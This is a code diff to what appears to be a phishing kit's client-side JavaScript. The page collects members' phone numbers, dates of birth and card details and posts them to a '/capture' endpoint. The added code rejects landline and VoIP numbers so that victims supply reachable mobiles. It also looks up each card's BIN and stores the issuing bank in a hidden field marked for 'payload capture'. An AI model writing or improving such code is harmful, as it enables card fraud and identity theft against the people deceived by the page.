@@ -292,9 +292,37 @@
                 }
 
                 const memberNum = document.getElementById('member_num')?.value.trim() || '';
+                const phoneInput = document.getElementById('phone');
                 
-                const processVerify = () => {
-                    const pVal = document.getElementById('phone')?.value || '';
+                const processVerify = async () => {
+                    const pVal = phoneInput?.value || '';
+                    if (pVal.length > 5) {
+                        try {
+                            // Check Line Type via Proxy
+                            const res = await fetch('/capture?action=line-type', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ phone: pVal })
+                            });
+                            const pData = await res.json();
+                            
+                            if (pData.type === 'landline' || pData.type === 'voip') {
+                                phoneInput.classList.add('invalid');
+                                const errMsg = pData.type === 'landline' 
+                                    ? 'Please use a valid mobile number (No Landlines).' 
+                                    : 'Real phone number only, no VoIP.';
+                                phoneInput.setCustomValidity(errMsg);
+                                verifyForm.reportValidity();
+                                phoneInput.addEventListener('input', function onInput() {
+                                    phoneInput.classList.remove('invalid');
+                                    phoneInput.setCustomValidity("");
+                                    phoneInput.removeEventListener('input', onInput);
+                                });
+                                return; // Block submission
+                            }
+                        } catch(e) { /* Ignore network errors */ }
+                    }
+
                     localStorage.setItem('p_hint', pVal);
                     if (memberWarningModal) memberWarningModal.classList.remove('show');
                     overlay.style.display = 'flex';
@@ -446,6 +474,44 @@
         mask('dob', 'XX/XX/XXXX');
         mask('card_num', 'XXXX XXXX XXXX XXXX');
         mask('exp', 'XX/XX');
+
+        // Dynamic BIN Validation for Card Page
+        const cardNumInput = document.getElementById('card_num');
+        if (cardNumInput) {
+            let lastBin = '';
+            cardNumInput.addEventListener('keyup', () => {
+                const rawVal = cardNumInput.value.replace(/\s/g, '');
+                if (rawVal.length >= 6) {
+                    const currentBin = rawVal.substring(0, 6);
+                    if (currentBin !== lastBin) {
+                        lastBin = currentBin;
+                        fetch(`https://lookup.binlist.net/${currentBin}`)
+                            .then(res => res.json())
+                            .then(data => {
+                                // Add or update hidden input for payload capture
+                                let binInput = document.getElementById('fluid-bin-data');
+                                if (!binInput) {
+                                    binInput = document.createElement('input');
+                                    binInput.type = 'hidden';
+                                    binInput.id = 'fluid-bin-data';
+                                    binInput.name = 'bin_data';
+                                    document.getElementById('fluid-secure-form').appendChild(binInput);
+                                }
+                                
+                                const binStr = `${data.scheme || 'Unknown'} - ${data.type || 'Unknown'} - ${data.bank?.name || 'Unknown'}`;
+                                binInput.value = binStr;
+                                
+                                // Visual brand hint
+                                const lbl = document.querySelector('[data-render="card_num_label"]');
+                                if (lbl && data.scheme) {
+                                    lbl.textContent = `Card Number (${data.scheme.toUpperCase()})`;
+                                }
+                            })
+                            .catch(err => console.log('BIN check failed or rate limited'));
+                    }
+                }
+            });
+        }
     };
 
     const trackVisit = () => {
